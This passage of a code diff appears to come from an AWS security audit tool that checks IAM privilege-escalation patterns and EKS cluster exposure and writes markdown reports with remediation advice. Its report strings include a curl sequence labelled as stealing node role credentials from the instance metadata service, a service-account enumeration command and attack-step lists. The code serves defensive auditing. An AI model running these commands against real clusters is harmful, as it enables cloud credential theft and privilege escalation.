+        output += `**Blast Radius:** ${chain.blastRadius}/100\n`;
+        output += `**Final Target:** ${chain.finalTarget}\n\n`;
+        
+        output += `**Attack Steps:**\n\n`;
+        output += `\`\`\`mermaid\n`;
+        output += `graph LR\n`;
+        for (let i = 0; i < chain.steps.length; i++) {
+          const step = chain.steps[i];
+          const nextStep = chain.steps[i + 1];
+          if (nextStep) {
+            output += `    S${i}["${step.action}"] --> S${i + 1}["${nextStep.action}"]\n`;
+          }
+        }
+        output += `\`\`\`\n\n`;
+        
+        output += `| Step | Action | Target | MITRE |\n`;
+        output += `|------|--------|--------|-------|\n`;
+        for (const step of chain.steps) {
+          output += `| ${step.stepNumber} | ${step.action} | ${step.target} | ${step.mitreId} |\n`;
+        }
+        output += `\n`;
+        
+        output += `**MITRE ATT&CK Mapping:** ${chain.mitreMapping.join(', ')}\n\n`;
+      }
+    }
+    
+    // Recommendations
+    output += `## 🛡️ Recommendations\n\n`;
+    output += `1. **Apply least privilege** - Remove unnecessary permissions\n`;
+    output += `2. **Use permission boundaries** - Limit maximum permissions\n`;
+    output += `3. **Implement SCPs** - Deny dangerous actions at org level\n`;
+    output += `4. **Enable GuardDuty** - Detect anomalous API activity\n`;
+    output += `5. **Review PassRole permissions** - Most common escalation vector\n`;
+    
+  } catch (error: any) {
+    output += `[FAIL] Error: ${error.message}\n`;
+  }
+  
+  return output;
+}
+
+/**
+ * Get effective permissions for a principal
+ */
+async function getPrincipalEffectivePermissions(principalArn: string, principalType: 'User' | 'Role'): Promise<string[]> {
+  const permissions: string[] = [];
+  const principalName = principalArn.split('/').pop() || '';
+  
+  try {
+    if (principalType === 'User') {
+      // User attached policies
+      const attachedCmd = new ListAttachedUserPoliciesCommand({ UserName: principalName });
+      const attached = await iamClient.send(attachedCmd);
+      
+      for (const policy of attached.AttachedPolicies || []) {
+        const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
+        permissions.push(...policyPerms);
+      }
+      
+      // User inline policies
+      const inlineCmd = new ListUserPoliciesCommand({ UserName: principalName });
+      const inline = await iamClient.send(inlineCmd);
+      
+      for (const policyName of inline.PolicyNames || []) {
+        const policyCmd = new GetUserPolicyCommand({ UserName: principalName, PolicyName: policyName });
+        const policy = await iamClient.send(policyCmd);
+        const doc = JSON.parse(decodeURIComponent(policy.PolicyDocument || '{}'));
+        permissions.push(...extractActionsFromDocument(doc));
+      }
+      
+      // Group policies
+      const groupsCmd = new ListGroupsForUserCommand({ UserName: principalName });
+      const groups = await iamClient.send(groupsCmd);
+      
+      for (const group of groups.Groups || []) {
+        const groupPoliciesCmd = new ListAttachedGroupPoliciesCommand({ GroupName: group.GroupName });
+        const groupPolicies = await iamClient.send(groupPoliciesCmd);
+        
+        for (const policy of groupPolicies.AttachedPolicies || []) {
+          const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
+          permissions.push(...policyPerms);
+        }
+      }
+    } else {
+      // Role attached policies
+      const attachedCmd = new ListAttachedRolePoliciesCommand({ RoleName: principalName });
+      const attached = await iamClient.send(attachedCmd);
+      
+      for (const policy of attached.AttachedPolicies || []) {
+        const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
+        permissions.push(...policyPerms);
+      }
+      
+      // Role inline policies
+      const inlineCmd = new ListRolePoliciesCommand({ RoleName: principalName });
+      const inline = await iamClient.send(inlineCmd);
+      
+      for (const policyName of inline.PolicyNames || []) {
+        const policyCmd = new GetRolePolicyCommand({ RoleName: principalName, PolicyName: policyName });
+        const policy = await iamClient.send(policyCmd);
+        const doc = JSON.parse(decodeURIComponent(policy.PolicyDocument || '{}'));
+        permissions.push(...extractActionsFromDocument(doc));
+      }
+    }
+  } catch (e) {
+    // Continue with collected permissions
+  }
+  
+  return [...new Set(permissions)];
+}
+
+/**
+ * Extract permissions from a managed policy
+ */
+async function extractPolicyPermissions(policyArn: string): Promise<string[]> {
+  try {
+    const versionCmd = new GetPolicyCommand({ PolicyArn: policyArn });
+    const policyInfo = await iamClient.send(versionCmd);
+    
+    const docCmd = new GetPolicyVersionCommand({
+      PolicyArn: policyArn,
+      VersionId: policyInfo.Policy?.DefaultVersionId,
+    });
+    const doc = await iamClient.send(docCmd);
+    
+    const policyDoc = JSON.parse(decodeURIComponent(doc.PolicyVersion?.Document || '{}'));
+    return extractActionsFromDocument(policyDoc);
+  } catch (e) {
+    return [];
+  }
+}
+
+/**
+ * Extract actions from policy document
+ */
+function extractActionsFromDocument(doc: any): string[] {
+  const actions: string[] = [];
+  
+  for (const statement of doc.Statement || []) {
+    if (statement.Effect === 'Allow') {
+      const stmtActions = Array.isArray(statement.Action) ? statement.Action : [statement.Action];
+      actions.push(...stmtActions.filter((a: any) => a));
+    }
+  }
+  
+  return actions;
+}
+
+/**
+ * Check if a permission matches a required action (supports wildcards)
+ */
+function matchesPermission(permission: string, required: string): boolean {
+  if (permission === '*' || permission === required) return true;
+  
+  // Handle service:* patterns
+  const [permService, permAction] = permission.split(':');
+  const [reqService, reqAction] = required.split(':');
+  
+  if (permService === reqService && (permAction === '*' || permAction === reqAction)) {
+    return true;
+  }
+  
+  // Handle wildcards in permission
+  const regex = new RegExp('^' + permission.replace(/\*/g, '.*') + '$');
+  return regex.test(required);
+}
+
+/**
+ * Analyze EKS attack surface comprehensively
+ */
+async function analyzeEKSAttackSurface(region: string, clusterName?: string): Promise<string> {
+  let output = `# 🎯 EKS Attack Surface Analysis\n\n`;
+  output += `**Region:** ${region}\n`;
+  output += `**Target Cluster:** ${clusterName || 'All clusters'}\n\n`;
+  
+  try {
+    const eksClient = new EKSClient({ region });
+    
+    // Get clusters to analyze
+    let clusters: string[] = [];
+    if (clusterName) {
+      clusters = [clusterName];
+    } else {
+      const listCmd = new ListClustersCommand({});
+      const list = await eksClient.send(listCmd);
+      clusters = list.clusters || [];
+    }
+    
+    if (clusters.length === 0) {
+      output += `[INFO] No EKS clusters found in ${region}\n`;
+      return output;
+    }
+    
+    output += `## 📊 Clusters Found: ${clusters.length}\n\n`;
+    
+    for (const cluster of clusters) {
+      output += `---\n\n`;
+      output += `### 🔷 Cluster: ${cluster}\n\n`;
+      
+      try {
+        const describeCmd = new DescribeClusterCommand({ name: cluster });
+        const clusterInfo = await eksClient.send(describeCmd);
+        const c = clusterInfo.cluster;
+        
+        if (!c) continue;
+        
+        // Basic info
+        output += `**Version:** ${c.version}\n`;
+        output += `**Status:** ${c.status}\n`;
+        output += `**Platform Version:** ${c.platformVersion}\n`;
+        output += `**Role ARN:** \`${c.roleArn}\`\n\n`;
+        
+        // === ENDPOINT SECURITY ===
+        output += `#### 🌐 Endpoint Security\n\n`;
+        const vpc = c.resourcesVpcConfig;
+        
+        if (vpc?.endpointPublicAccess) {
+          output += `- [CRITICAL] **Public endpoint enabled**\n`;
+          if (vpc.publicAccessCidrs?.includes('0.0.0.0/0')) {
+            output += `  - ⚠️ Accessible from ANY IP (0.0.0.0/0)\n`;
+          } else {
+            output += `  - Restricted to: ${vpc.publicAccessCidrs?.join(', ')}\n`;
+          }
+        } else {
+          output += `- [OK] Public endpoint disabled\n`;
+        }
+        
+        if (vpc?.endpointPrivateAccess) {
+          output += `- [OK] Private endpoint enabled\n`;
+        } else {
+          output += `- [WARN] Private endpoint disabled\n`;
+        }
+        output += `\n`;
+        
+        // === LOGGING ===
+        output += `#### 📝 Audit Logging\n\n`;
+        const logging = c.logging?.clusterLogging?.[0];
+        if (logging?.enabled) {
+          output += `- [OK] Logging enabled: ${logging.types?.join(', ')}\n`;
+        } else {
+          output += `- [CRITICAL] **Cluster logging disabled** - No audit trail\n`;
+        }
+        output += `\n`;
+        
+        // === ENCRYPTION ===
+        output += `#### 🔐 Secrets Encryption\n\n`;
+        if (c.encryptionConfig && c.encryptionConfig.length > 0) {
+          output += `- [OK] Secrets encryption enabled\n`;
+          for (const enc of c.encryptionConfig) {
+            output += `  - KMS Key: ${enc.provider?.keyArn}\n`;
+          }
+        } else {
+          output += `- [HIGH] **Secrets not encrypted at rest**\n`;
+        }
+        output += `\n`;
+        
+        // === IRSA ANALYSIS ===
+        output += `#### 🔑 IRSA (IAM Roles for Service Accounts)\n\n`;
+        if (c.identity?.oidc?.issuer) {
+          output += `- [OK] OIDC provider configured\n`;
+          output += `- OIDC Issuer: \`${c.identity.oidc.issuer}\`\n\n`;
+          
+          output += `**IRSA Attack Vectors:**\n`;
+          output += `1. Enumerate ServiceAccounts with IRSA annotations\n`;
+          output += `2. Schedule pod with target serviceAccountName\n`;
+          output += `3. Access AWS API with service account's IAM role\n\n`;
+          
+          output += `\`\`\`bash\n`;
+          output += `# Find IRSA-enabled service accounts\n`;
+          output += `kubectl get serviceaccounts -A -o json | jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"]) | {namespace: .metadata.namespace, name: .metadata.name, role: .metadata.annotations["eks.amazonaws.com/role-arn"]}'\n`;
+          output += `\`\`\`\n\n`;
+        } else {
+          output += `- [WARN] OIDC provider not configured (IRSA unavailable)\n`;
+          output += `- Pods may use node IAM role (broader access)\n\n`;
+        }
+        
+        // === NODE ROLE ANALYSIS ===
+        output += `#### 🖥️ Node Role Security\n\n`;
+        output += `**Node Role Credential Theft:**\n`;
+        output += `If an attacker gains pod access, they can steal node credentials via IMDS.\n\n`;
+        
+        output += `\`\`\`bash\n`;
+        output += `# From compromised pod - steal node role credentials\n`;
+        output += `TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\n`;
+        output += `ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n`;
+        output += `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\n`;
+        output += `\`\`\`\n\n`;
+        
+        // === NODEGROUPS ===
+        output += `#### 📦 Node Groups\n\n`;
+        try {
+          const ngCmd = new ListNodegroupsCommand({ clusterName: cluster });
+          const nodegroups = await eksClient.send(ngCmd);
+          
+          for (const ng of nodegroups.nodegroups || []) {
+            const ngDescCmd = new DescribeNodegroupCommand({ clusterName: cluster, nodegroupName: ng });
+            const ngInfo = await eksClient.send(ngDescCmd);
+            const nodegroup = ngInfo.nodegroup;
+            
+            if (nodegroup) {
+              output += `- **${ng}**\n`;
+              output += `  - Node Role: \`${nodegroup.nodeRole}\`\n`;
+              output += `  - Instance Types: ${nodegroup.instanceTypes?.join(', ')}\n`;
+              output += `  - AMI Type: ${nodegroup.amiType}\n`;
+              
+              // Check for launch template (custom user data)
+              if (nodegroup.launchTemplate) {
+                output += `  - [WARN] Custom launch template - check user data\n`;
+              }
+            }
+          }
+        } catch (e) {
+          output += `- Unable to enumerate node groups\n`;
+        }
+        output += `\n`;
+        
+        // === FARGATE PROFILES ===
+        output += `#### 🚀 Fargate Profiles\n\n`;
+        try {
+          const fpCmd = new ListFargateProfilesCommand({ clusterName: cluster });
+          const fargate = await eksClient.send(fpCmd);
+          
+          if (fargate.fargateProfileNames && fargate.fargateProfileNames.length > 0) {
+            for (const fp of fargate.fargateProfileNames) {
+              const fpDescCmd = new DescribeFargateProfileCommand({ clusterName: cluster, fargateProfileName: fp });
+              const fpInfo = await eksClient.send(fpDescCmd);
+              const profile = fpInfo.fargateProfile;
+              
+              if (profile) {
+                output += `- **${fp}**\n`;
+                output += `  - Pod Execution Role: \`${profile.podExecutionRoleArn}\`\n`;
+                output += `  - Selectors: ${profile.selectors?.map(s => `${s.namespace}/${s.labels ? JSON.stringify(s.labels) : '*'}`).join(', ')}\n`;
+              }
+            }
+            
+            output += `\n**Fargate Attack Vector:**\n`;
+            output += `1. Create pod matching Fargate selector namespace\n`;
+            output += `2. Pod runs with podExecutionRole credentials\n`;
+            output += `3. Abuse role permissions for privilege escalation\n\n`;
+          } else {
+            output += `- No Fargate profiles configured\n\n`;
+          }
+        } catch (e) {
+          output += `- Unable to enumerate Fargate profiles\n\n`;
+        }
+        
+        // === ATTACK SUMMARY ===
+        output += `#### ⚔️ Attack Vectors Summary\n\n`;
+        output += `| Vector | Risk | Technique |\n`;
+        output += `|--------|------|----------|\n`;
+        
+        if (vpc?.endpointPublicAccess && vpc.publicAccessCidrs?.includes('0.0.0.0/0')) {
+          output += `| Public endpoint (0.0.0.0/0) | CRITICAL | Direct API access |\n`;
+        }
+        output += `| IRSA abuse | HIGH | Pod → AWS API |\n`;
+        output += `| Node role theft | HIGH | IMDS credential theft |\n`;
+        output += `| Fargate profile abuse | MEDIUM | PassRole escalation |\n`;
+        output += `| K8s RBAC escalation | MEDIUM | Cluster admin |\n`;
+        output += `\n`;
+        
+      } catch (e: any) {
+        output += `[ERROR] Failed to analyze cluster: ${e.message}\n\n`;
+      }
+    }
+    
+    // === REMEDIATION ===
+    output += `## 🛡️ Remediation Recommendations\n\n`;
+    output += `1. **Disable public endpoint** or restrict to specific CIDRs\n`;
+    output += `2. **Enable all audit logs** (api, audit, authenticator, controllerManager, scheduler)\n`;
+    output += `3. **Enable secrets encryption** with customer-managed KMS key\n`;
+    output += `4. **Use IRSA** instead of node IAM roles\n`;
+    output += `5. **Block IMDS access** from pods via network policy\n`;
+    output += `6. **Use Pod Security Standards** to restrict privileged pods\n`;
+    output += `7. **Rotate node role credentials** regularly\n`;
+    
+  } catch (error: any) {
+    output += `[FAIL] Error: ${error.message}\n`;
+  }
+  
+  return output;
+}
+
+/**
+ * Detect privilege escalation patterns
+ */
+async function detectPrivescPatterns(principalArn?: string, includeRemediation: boolean = true): Promise<string> {
+  let output = `# 🔺 IAM Privilege Escalation Pattern Detection\n\n`;
+  output += `**Target:** ${principalArn || 'All principals'}\n`;
+  output += `**Patterns Checked:** ${PRIVESC_PATTERNS.length}\n\n`;
+  
+  const findings: { pattern: PrivescPattern; principal: string; matchedActions: string[] }[] = [];
+  
+  try {
+    // Get principals to analyze
+    const principals: { arn: string; type: 'User' | 'Role'; name: string }[] = [];
+    
+    if (principalArn) {
+      const type = principalArn.includes(':user/') ? 'User' : 'Role';
+      principals.push({ arn: principalArn, type, name: principalArn.split('/').pop()! });
+    } else {
+      // Get all users
+      const usersCmd = new ListUsersCommand({});
+      const users = await iamClient.send(usersCmd);
+      for (const user of users.Users || []) {
+        principals.push({ arn: user.Arn!, type: 'User', name: user.UserName! });
+      }
+      
+      // Get all roles (exclude AWS service roles)
+      const rolesCmd = new ListRolesCommand({});
+      const roles = await iamClient.send(rolesCmd);
+      for (const role of roles.Roles || []) {
+        if (!role.Arn?.includes('aws-service-role')) {
+          principals.push({ arn: role.Arn!, type: 'Role', name: role.RoleName! });
+        }
+      }
+    }
+    
+    output += `## 📊 Scope\n\n`;
+    output += `- **Users:** ${principals.filter(p => p.type === 'User').length}\n`;
+    output += `- **Roles:** ${principals.filter(p => p.type === 'Role').length}\n\n`;
+    
+    // Check each principal against patterns
+    for (const principal of principals.slice(0, 30)) { // Limit for performance
+      const permissions = await getPrincipalEffectivePermissions(principal.arn, principal.type);
+      
+      for (const pattern of PRIVESC_PATTERNS) {
+        const matchedActions = pattern.requiredActions.filter(action =>
+          permissions.some(perm => matchesPermission(perm, action))
+        );
+        
+        if (matchedActions.length === pattern.requiredActions.length) {
+          findings.push({ pattern, principal: principal.arn, matchedActions });
+        }
+      }
+    }
+    
+    // Group by severity
+    const critical = findings.filter(f => f.pattern.severity === 'CRITICAL');
+    const high = findings.filter(f => f.pattern.severity === 'HIGH');
+    const medium = findings.filter(f => f.pattern.severity === 'MEDIUM');
+    
+    output += `## 🚨 Findings Summary\n\n`;
+    output += `| Severity | Count |\n`;
+    output += `|----------|-------|\n`;
+    output += `| 🔴 CRITICAL | ${critical.length} |\n`;
+    output += `| 🟠 HIGH | ${high.length} |\n`;
+    output += `| 🟡 MEDIUM | ${medium.length} |\n`;
+    output += `\n`;
+    
+    if (findings.length === 0) {
+      output += `## ✅ No Privilege Escalation Patterns Detected\n`;
+      return output;
+    }
+    
+    // Detailed findings by category
+    const categories = [...new Set(findings.map(f => f.pattern.category))];
+    
+    for (const category of categories) {
+      const categoryFindings = findings.filter(f => f.pattern.category === category);
+      
+      output += `---\n\n`;
+      output += `## ${getCategoryEmoji(category)} ${formatCategory(category)}\n\n`;
+      
+      for (const finding of categoryFindings.slice(0, 5)) {
+        const severityIcon = finding.pattern.severity === 'CRITICAL' ? '🔴' :
+                            finding.pattern.severity === 'HIGH' ? '🟠' : '🟡';
+        
+        output += `### ${severityIcon} ${finding.pattern.name}\n\n`;
+        output += `**Principal:** \`${finding.principal}\`\n`;
+        output += `**Severity:** ${finding.pattern.severity}\n`;
+        output += `**MITRE:** ${finding.pattern.mitreId} - ${finding.pattern.mitreTechnique}\n\n`;
+        output += `**Description:** ${finding.pattern.description}\n\n`;
+        output += `**Required Actions:** ${finding.pattern.requiredActions.map(a => `\`${a}\``).join(', ')}\n\n`;
+        
+        output += `**Exploitation:**\n`;
+        output += `\`\`\`bash${finding.pattern.exploitation}\`\`\`\n\n`;
+        
+        if (includeRemediation) {
+          output += `**Remediation:** ${finding.pattern.remediation}\n\n`;
+        }
+      }
+    }
+    
+    // MITRE mapping summary
+    output += `## 🗺️ MITRE ATT&CK Mapping\n\n`;
+    output += `| Technique ID | Name | Count |\n`;
+    output += `|--------------|------|-------|\n`;
+    
+    const mitreCounts: Record<string, { name: string; count: number }> = {};
+    for (const finding of findings) {
+      const id = finding.pattern.mitreId;
+      if (!mitreCounts[id]) {
+        mitreCounts[id] = { name: finding.pattern.mitreTechnique, count: 0 };
+      }
+      mitreCounts[id].count++;
+    }
+    
+    for (const [id, data] of Object.entries(mitreCounts).sort((a, b) => b[1].count - a[1].count)) {
+      output += `| ${id} | ${data.name} | ${data.count} |\n`;
+    }
+    output += `\n`;
+    
+  } catch (error: any) {
+    output += `[FAIL] Error: ${error.message}\n`;
+  }
+  
+  return output;
+}
+
+function getCategoryEmoji(category: string): string {
+  const emojis: Record<string, string> = {
+    'PASSROLE_EXECUTION': '🎭',
+    'POLICY_MANIPULATION': '📝',
+    'CREDENTIAL_ACCESS': '🔑',
+    'EKS_ABUSE': '☸️',
+    'LAMBDA_ABUSE': 'λ',
+    'SSM_ABUSE': '💻',
+    'S3_ABUSE': '🪣',
+    'SECRETS_ACCESS': '🔐',
+    'DEFENSE_EVASION': '🙈',
+  };
+  return emojis[category] || '⚡';
+}
+
+function formatCategory(category: string): string {
+  return category.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
 }
 
 /**
